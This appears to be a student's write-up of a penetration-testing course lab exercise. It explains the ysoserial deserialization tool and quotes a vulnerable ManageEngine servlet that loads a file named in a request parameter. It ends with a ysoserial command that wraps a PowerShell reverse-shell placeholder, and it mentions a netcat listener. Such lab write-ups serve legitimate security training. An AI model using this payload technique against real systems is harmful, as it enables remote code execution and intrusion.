# ysoserial.net (Extra Mile 7.4.1.4)

*Although we have not discussed Java deserialization vulnerabilities in this course, it is worth
mentioning that one such vulnerability exists in the ManageEngine Applications Manager instance
in your lab. We encourage you to get familiar with the Java ysoserial version and try to identify
and exploit this vulnerability.*

Ysoserial is a collection of gadget chains in common .NET/Java libraries that can exploit .NET/Java applications performing unsafe deserialization of objects. The main driver program takes a user-command and wraps it in a gadget chain, then serializes these objects to stdout. When applications unsafely deserialize this data, the chain will be invoked and cause the command to be executed. (Source: https://github.com/pwntester/ysoserial.net for .NET, https://github.com/frohoff/ysoserial for Java)

Aside from looking directly at APIs (via doGet and doPost), a way to look for deserialization attack vectors is to such for evidence of writing into the file stream, in this case, searching for the `FileInputStream` object. In doing so, we find the functionality in the `CustomFieldsFeedServelet`. In this functionality, we see that the variable `customFieldObject` is used as a file name with no sanitation — meaning that it’s vulnerable to a file inclusion attack. As such, we can inject our malicious deserialization payload through this servlet. 

```java
public class CustomFieldsFeedServlet extends javax.servlet.http.HttpServlet
 {
   public void doPost(HttpServletRequest request, HttpServletResponse response) throws javax.servlet.ServletException, IOException
  {
     doGet(request, response);
   }   
 
   public void doGet(HttpServletRequest request, HttpServletResponse response)
     throws javax.servlet.ServletException, IOException
   {
   try
   {
     fileName = request.getParameter("customFieldObject");
     if ((fileName != null) && (!fileName.equals(""))) {
       response.setHeader("Content-Type", "text/xml");
       ObjectOutputStream out = null;
       FileInputStream fis = null;
       ObjectInputStream ois = null;
       try
       {
        fis = new FileInputStream(fileName);
         ois = new ObjectInputStream(fis);
         java.util.HashMap today = (java.util.HashMap)ois.readObject();
         ois.close();
         out = new ObjectOutputStream(response.getOutputStream());
         out.writeObject(today);
     }
   }
}
```

We’ll use Ysoserial to generate our payload for the application. For the gadget type, we can use CommonCollections1 as the default — although brute-forcing some of the common ones would work too. Since Ysoserial’s CommonCollections doesn’t work in Java, we can use https://github.com/frohoff/ysoserial/issues/203 to swap between Java versions. Once we’re done, we simply setup our netcat listener and SMB share. 

```bash
java -jar ysoserial-all.jar CommonsCollections1 'powershell -e <reverse shell>' > payload
```